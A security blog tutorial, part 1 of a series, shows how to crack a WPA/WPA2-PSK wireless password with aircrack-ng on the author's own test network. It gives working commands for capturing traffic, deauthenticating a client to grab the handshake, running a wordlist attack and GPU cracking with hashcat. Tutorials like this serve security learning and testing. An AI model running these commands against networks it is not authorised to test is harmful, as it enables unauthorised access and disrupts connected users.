---
layout: single
title: Wireless Attacks Part 1 - Cracking WPA/WPA2 with PSK
date: 2021-04-06
classes: wide
header:
  teaser: /assets/images/WPA/teaser.PNG
tags:
  - WPA
  - WPA2
  - Wireless
  - Attacks
  - Aircrack-ng
  - PSK
--- 

# Introduction

In this post I'll be demonstrating how to attack wireless networks secured with WPA/WPA2. 

## A little bit about WPA

Wi-Fi Protected Access (WPA) was designed to address flaws that were discovered in WEP. WPA version 1 still uses the RC4 cipher present in the vulnerable WEP but adds a Temporal Key Integrity Protocol (TKIP) in order to ensure a unique keystream and resist replay attacks. 

The main difference between WPA and WPA2 is the introduction of Advanced Encryption Standard (AES) with Counter Mode Cipher Block Chaining Message Authentication Code Protocol (CCMP). AES covers the job that RC4 did and CCMP covers the job of TKIP. The AES block cipher is much stronger than RC4 so allows for stronger encryption of data. 

If you're interested, you can read more on [Wikipedia](https://en.wikipedia.org/wiki/Wi-Fi_Protected_Access)

# Equipment 

- A Wireless Access Point (WAP) that supports WPA
- aircrack-ng suite (pre-installed on [Kali](https://www.kali.org))
- Wireless card
- At least one wireless client

# Prerequisites 

- Your wireless card must be able to pass the [Injection test](https://www.aircrack-ng.org/doku.php?id=injection_test)

![](/assets/images/WPA/test.PNG)

- Your wireless card is close enough to send and receive access point and wireless client packets.

# Getting started

Enough of this chit-chat about wireless anyway, lets crack some!

It should be noted that this is a test network with intentionally weak credentials and is reset when finished.  

The ESSID of my WAP is "TEST-NET"

I should also note that you can view your wireless cards MAC address on Kali with `macchanger --show <interface>`

Firstly, enter your card into monitor mode. You can check the interface name with `iwconfig` and then use `airmon-ng` to change the card from managed to monitor mode.

```
sudo airmon-ng start wlan0
```

![](/assets/images/WPA/enter-monitor.PNG)

![](/assets/images/WPA/iwconfig.PNG)

Now, you'll want to use `airodump-ng` to find your WAP

```
sudo airodump-ng wlan0mon
```

![](/assets/images/WPA/LSTN.PNG)

Once found, capture packets specifically for that WAP. 

```
sudo airodump-ng --bssid <BSSID here> -c 2 -w capture wlan0mon
```

- --bssid is the BSSID of the WAP
- -c is the channel number
- -w is our output file
- wlan0mon is the interface of my card

![](/assets/images/WPA/LSTN-SPEC.PNG)

We can see that there is 1 connected client (an old phone), we need to [Deauthenticate](https://www.aircrack-ng.org/doku.php?id=deauthentication) this device in order to capture a 4-way handshake. We can deauthenticate this device as follows.

```
sudo aireplay-ng -0 1 -e "TEST-NET" -a <BSSID here> -c <client MAC here> wlan0mon
```

- -e is the ESSID of the WAP
- -a is the BSSID 
- -c is our client MAC
- wlan0mon is the interface of my card

This image shows output from airodump-ng which confirms a handshake has been captured.

![](/assets/images/WPA/Captured-handshake.PNG)

Finally, we just need to crack this captured data. 

```
sudo aircrack-ng -w /opt/rockyou.txt -b <BSSID> capture-01.cap
```

- -w is the wordlist I am using, use whatever wordlist you like
- -b is the BSSID of the WAP
- capture-01.cap is the capture file written by airodump-ng

![](/assets/images/WPA/cracked.PNG)

# OTHER TRICKERY

> Convert the .cap file to .hccapx so you crack using your GPU on your host machine, instead of the CPU on a virtual machine :)

```
/sbin/cap2hccapx capture-01.cap capturefile-01.hccapx

hashcat64.exe -m 2500 capturefile-01.hccapx rockyou.txt
```